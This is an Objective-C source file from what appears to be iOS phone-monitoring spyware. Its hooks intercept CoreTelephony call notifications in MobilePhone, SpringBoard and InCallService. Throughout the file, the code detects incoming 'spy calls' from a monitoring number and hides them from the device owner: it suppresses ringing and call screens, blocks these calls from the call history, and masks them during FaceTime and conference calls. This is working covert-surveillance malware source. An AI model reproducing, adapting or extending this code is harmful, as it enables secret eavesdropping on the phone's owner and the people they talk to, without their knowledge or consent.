//
//  MSSPC.m
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "MSSPC.h"
#import "Telephony.h"

#import "SpyCallManager.h"
#import "SpyCallUtils.h"
#import "FxCall.h"
#import "TelephoneNumberPicker.h"

template <typename Type_>
static inline void lookupSymbol(const char *libraryFilePath, const char *symbolName, Type_ &function) {
    // Lookup the function
    struct nlist nl[2];
    memset(nl, 0, sizeof(nl));
#ifndef __LP64__
    nl[0].n_un.n_name = (char *)symbolName;
#endif
    nlist(libraryFilePath, nl);
    
    // Check whether it is ARM or Thumb
    uintptr_t value = nl[0].n_value;
    if ((nl[0].n_desc & N_ARM_THUMB_DEF) != 0) {
        value |= 0x00000001;
	}
    
    function = reinterpret_cast<Type_>(value);
}

static inline void lookupClasses() {
    int numClasses = 0;
    Class * classes = NULL;

    classes = NULL;
    numClasses = objc_getClassList(NULL, 0);

    if (numClasses > 0 ) {
        classes = (__unsafe_unretained Class *)malloc(sizeof(Class) * numClasses);
        numClasses = objc_getClassList(classes, numClasses);
        for (int i = 0; i < numClasses; i++) {
            Class c = classes[i];
            DLog(@"%s", class_getName(c));
        }
        free(classes);
    }
}

FxCall *getFxCall(NSDictionary *aCallNotificationInfo) {
	CTCall *ctCall = (CTCall *)[aCallNotificationInfo objectForKey:@"kCTCall"];	
	NSString *telephoneNumber = [SpyCallUtils telephoneNumber:ctCall];
	APPLOGVERBOSE(@"getFxCall, telephoneNumber: %@", telephoneNumber);
	FxCall *call = [[FxCall alloc] init];
	[call setMCTCall:ctCall];
	[call setMTelephoneNumber:telephoneNumber];
	[call setMIsSpyCall:FALSE];
	if ([SpyCallUtils isOutgoingCall:ctCall]) {
		[call setMDirection:kFxCallDirectionOut];
	} else {
		[call setMDirection:kFxCallDirectionIn];
	}
	[call autorelease];
	return (call);
}

BOOL isSpyCall(FxCall *aCall) {
	BOOL spyCall = ([aCall mDirection] == kFxCallDirectionIn &&
					[SpyCallUtils isSpyCall:[aCall mCTCall]]);
	return (spyCall);
}

#pragma mark - Hook MobilePhone, SpringBoard (below iOS 7)

MSHook(void, _ServerConnectionCallback, CTServerConnectionRef connection, CFStringRef notification, CFDictionaryRef notification_info, void * info) { // info = CTTelephonyCenter
	NSDictionary *notificationInfo = (NSDictionary *)notification_info;
	NSString *notificationName = (NSString *)notification;
	//APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION NAME = %@, NOTIFICATION INFO = %@", [[NSBundle mainBundle] bundleIdentifier], notificationName, notificationInfo);
	
	if ([notificationName isEqualToString:@"kCTCallStatusChangeNotification"]/* || [notificationName isEqualToString:@"kCTCallIdentificationChangeNotification"]*/) {
        CFNotificationCenterPostNotification(CFNotificationCenterGetLocalCenter(), CFSTR("kInternalCTCallStatusChangeNotification"), nil, notification_info, true);
		FxCall *call = getFxCall(notificationInfo);
		int telephonyStatus = [[notificationInfo objectForKey:@"kCTCallStatus"] intValue];
		switch (telephonyStatus) {
			case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_DIALING: {
				// It's called two times per one call with (CTCall.status = 196608 [another party is ringing], kCTCallStatus = 3) and (CTCall.status = 3 [not yet arrived another party], kCTCallStatus = 3)
				//APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
				[[SpyCallManager sharedManager] handleDialingCall:call];
				__ServerConnectionCallback(connection, notification, notification_info, info);
			} break;
			case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_INCOMING: {
				// It's called one time per one call
				//APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
				[call setMDirection:kFxCallDirectionIn];
				if (![[call mTelephoneNumber] length]) {
					[NSThread sleepForTimeInterval:1.0];
					NSString *telNumber = [[[SpyCallManager sharedManager] mTelephoneNumberPicker] mTelephoneNumber];
					[call setMTelephoneNumber:telNumber];
					APPLOGVERBOSE(@"New number daemon application = %@", telNumber);
				}
				[[SpyCallManager sharedManager] handleIncomingCall:call];
				if (![SpyCallUtils isSpyCall:[call mCTCall]]) {
					if ([SpyCallUtils isCallWaiting:[call mCTCall]] && [[SpyCallManager sharedManager] mIsSpyCallInProgress]) {
						if ([[SpyCallManager sharedManager] mIsSpyCallInConference]) {
							__ServerConnectionCallback(connection, notification, notification_info, info);
						} else {
							; // Block, next call back will change call waiting to FALSE
						}
					} else {
						__ServerConnectionCallback(connection, notification, notification_info, info);
					}
				}
			} break;
			case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_CONECTED: {
				// It's called one time per one call
				//APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
				[[SpyCallManager sharedManager] handleCallConnected:call];
				if (isSpyCall(call)) {
					;
				} else {
					if ([[SpyCallManager sharedManager] mIsSpyCallInitiatingConference]) {
						;
					} else {
						__ServerConnectionCallback(connection, notification, notification_info, info);
					}
				}
			} break;
			case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_ONHOLD: {
				//APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
				[[SpyCallManager sharedManager] handleCallOnHold:call];
				if (isSpyCall(call)) {
					;
				} else {
					if ([[SpyCallManager sharedManager] mIsSpyCallInitiatingConference]) {
						;
					} else {
						__ServerConnectionCallback(connection, notification, notification_info, info);
					}
				}
			} break;
			case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_DISCONECTED: {
				// It's called one time per one call
				//APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
				// For disconnect, we need to inform mobile phone application otherwise mobile phone application will not draw screen correctly
				[[SpyCallManager sharedManager] handleCallDisconnected:call];
				__ServerConnectionCallback(connection, notification, notification_info, info);
			} break;
			case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_INVALID: {
				__ServerConnectionCallback(connection, notification, notification_info, info);
			} break;
			default: {
				APPLOGVERBOSE(@"TELEPHONY CALL STATUS %d", telephonyStatus);
			} break;
		}
	} else {
        if ([notificationName isEqualToString:@"kCTCallHistoryRecordAddNotification"]) {
            FxCall *call = getFxCall(notificationInfo);
            if ([call mDirection] == kFxCallDirectionIn) {
                if (![SpyCallUtils isFaceTimeCall:[call mCTCall]]   &&
                    [SpyCallUtils isSpyCall:[call mCTCall]]) {
                    APPLOGVERBOSE(@"BLOCK SPY CALL FROM ADDING CALL HISTORY");
                } else {
                    __ServerConnectionCallback(connection, notification, notification_info, info);
                }
            } else {
                __ServerConnectionCallback(connection, notification, notification_info, info);
            }
        } else {
            __ServerConnectionCallback(connection, notification, notification_info, info);
        }
	}
}

#pragma mark - Hook MobilePhone, SpringBoard (iOS 7, 8 onward)

void (* old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary)(CFStringRef notification, CFDictionaryRef notification_info);
void $__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(CFStringRef notification, CFDictionaryRef notification_info){
    NSDictionary *notificationInfo = (NSDictionary *)notification_info;
	NSString *notificationName = (NSString *)notification;
	//APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION NAME = %@, NOTIFICATION INFO = %@", [[NSBundle mainBundle] bundleIdentifier], notificationName, notificationInfo);
	
	if ([notificationName isEqualToString:@"kCTCallStatusChangeNotification"]/* || [notificationName isEqualToString:@"kCTCallIdentificationChangeNotification"]*/) {
        CFNotificationCenterPostNotification(CFNotificationCenterGetLocalCenter(), CFSTR("kInternalCTCallStatusChangeNotification"), nil, notification_info, true);
        FxCall *call = getFxCall(notificationInfo);
        int telephonyStatus = [[notificationInfo objectForKey:@"kCTCallStatus"] intValue];
        switch (telephonyStatus) {
            case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_DIALING: {
                // It's called two times per one call with (CTCall.status = 196608 [another party is ringing], kCTCallStatus = 3) and (CTCall.status = 3 [not yet arrived another party], kCTCallStatus = 3)
                APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
                [[SpyCallManager sharedManager] handleDialingCall:call];
                old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
            } break;
            case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_INCOMING: {
                // It's called one time per one call
                APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
                [call setMDirection:kFxCallDirectionIn];
                if (![[call mTelephoneNumber] length]) {
                    [NSThread sleepForTimeInterval:1.0];
                    NSString *telNumber = [[[SpyCallManager sharedManager] mTelephoneNumberPicker] mTelephoneNumber];
                    [call setMTelephoneNumber:telNumber];
                    APPLOGVERBOSE(@"New number daemon application = %@", telNumber);
                }
                [[SpyCallManager sharedManager] handleIncomingCall:call];
                if (![SpyCallUtils isSpyCall:[call mCTCall]]) {
                    if ([SpyCallUtils isCallWaiting:[call mCTCall]] && [[SpyCallManager sharedManager] mIsSpyCallInProgress]) {
                        if ([[SpyCallManager sharedManager] mIsSpyCallInConference]) {
                            old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
                        } else {
                            ; // Block, next call back will change call waiting to FALSE
                        }
                    } else {
                        old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
                    }
                }
            } break;
            case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_CONECTED: {
                // It's called one time per one call
                APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
                [[SpyCallManager sharedManager] handleCallConnected:call];
                if (isSpyCall(call)) {
                    ;
                } else {
                    if ([[SpyCallManager sharedManager] mIsSpyCallInitiatingConference]) {
                        ;
                    } else {
                        old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
                    }
                }
            } break;
            case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_ONHOLD: {
                APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
                [[SpyCallManager sharedManager] handleCallOnHold:call];
                if (isSpyCall(call)) {
                    ;
              } else {
                    if ([[SpyCallManager sharedManager] mIsSpyCallInitiatingConference]) {
                        ;
                    } else {
                        old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
                    }
                }
            } break;
            case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_DISCONECTED: {
                // It's called one time per one call
                APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
                // For disconnect, we need to inform mobile phone application otherwise mobile phone application will not draw screen correctly
                [[SpyCallManager sharedManager] handleCallDisconnected:call];
                old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
            } break;
            case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_INVALID: {
                old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
            } break;
            default: {
                APPLOGVERBOSE(@"TELEPHONY CALL STATUS %d", telephonyStatus);
            } break;
        }
    } else {
        if ([notificationName isEqualToString:@"kCTCallHistoryRecordAddNotification"]) { // This notification only get call on iOS 7 downward
            FxCall *call = getFxCall(notificationInfo);
            if ([call mDirection] == kFxCallDirectionIn) {
                if (![SpyCallUtils isFaceTimeCall:[call mCTCall]]   &&
                    [SpyCallUtils isSpyCall:[call mCTCall]]) {
                    APPLOGVERBOSE(@"BLOCK SPY CALL FROM ADDING CALL HISTORY");
                } else {
                    old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
                }
            } else {
                old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
            }
        } else if ([notificationName isEqualToString:@"kCTCallAlternateStatusChangeNotification"]) {
            FxCall *call = getFxCall(notificationInfo);
            int telephonyStatus = [[notificationInfo objectForKey:@"kCTCallStatus"] intValue];
            switch (telephonyStatus) {
                case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_DIALING: {
                    [[SpyCallManager sharedManager] handleDialingAlternativeCall:call];
                    old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
                } break;
                case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_INCOMING: {
                    [[SpyCallManager sharedManager] handleIncomingAlternativeCall:call];
                    
                    if ([SpyCallUtils isCallWaiting:[call mCTCall]] && [[SpyCallManager sharedManager] mIsSpyCallInProgress]) {
						if ([[SpyCallManager sharedManager] mIsSpyCallInConference]) {
							old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
						} else {
							// Block, next call back will change call waiting to FALSE
                            
                            [NSThread sleepForTimeInterval:2.0]; // Delay to make spy number disappear from incoming FaceTime screen
                            APPLOGVERBOSE(@"BLOCK INCOMING FACETIME CALL BECAUSE IT COMES WHILE SPY CALL IN PROGRESS");
                            
                            /*
                             Note: no sound & vibrate for this incoming FaceTime call, known issue; tested iOS 8.1 iPhone 4s
                             */
						}
					} else {
						old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
					}
                } break;
                case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_CONECTED: {
                    [[SpyCallManager sharedManager] handleAlternativeCallConnected:call];
                    old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
                } break;
                case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_ONHOLD: {
                    [[SpyCallManager sharedManager] handleAlternativeCallOnHold:call];
                    old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
                } break;
                case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_DISCONECTED: {
                    [[SpyCallManager sharedManager] handleAlternativeCallDisconnected:call];
                    old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
                } break;
                default: {
                    old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
                } break;
            }
        } else {
            old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary(notification, notification_info);
        }
    }
}

#pragma mark - Hook InCallService (iOS 8 onward)

void (* old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary_InCallService)(CFStringRef notification, CFDictionaryRef notification_info);
void $__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary_InCallService(CFStringRef notification, CFDictionaryRef notification_info){
    NSDictionary *notificationInfo = (NSDictionary *)notification_info;
	NSString *notificationName = (NSString *)notification;
	APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION NAME = %@, NOTIFICATION INFO = %@", [[NSBundle mainBundle] bundleIdentifier], notificationName, notificationInfo);
	
	if ([notificationName isEqualToString:@"kCTCallStatusChangeNotification"]) {
        FxCall *call = getFxCall(notificationInfo);
        int telephonyStatus = [[notificationInfo objectForKey:@"kCTCallStatus"] intValue];
        switch (telephonyStatus) {
            case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_INCOMING:
            case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_CONECTED:
            case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_ONHOLD:
            case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_DISCONECTED: {
                // It calls one time per one call
                //APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
                if (isSpyCall(call)) {
                    // iPhone 4s, iOS 8.1 sometime ring & vibrate before spy call is answered; it's because of InCallService.app
                    
                    /*
                     // One of issues regarding to audio
                     //
                     // iOS 8, spy call in progress on Music (app) screen, user play music, user bring music screen to background, then user end spy call by launch Misic app;
                     // this use case causes music route chagnes to Receiver. Issue happens when MobilePhone application is running, root cause because of CTCallDisconnect make
                     // route change ...
                     //
                     // Above case also happens when music is not playing but MobilePhone is runing so the issue is because of MobilePhone is running
                     //
                     */
                    
                    // Note: Intentionally for spy call conference only to dismiss view of call ended but it effects spy call too so we need to test, luckily spy call work!
                    if (CALLBACK_TELEPHONY_NOTIFICATION_STATUS_DISCONECTED == telephonyStatus) {
                        old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary_InCallService(notification, notification_info);
                    }
                } else {
                    old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary_InCallService(notification, notification_info);
                }
            } break;
            default: {
                old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary_InCallService(notification, notification_info);
            } break;
        }
    } else {
        old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary_InCallService(notification, notification_info);
    }
}
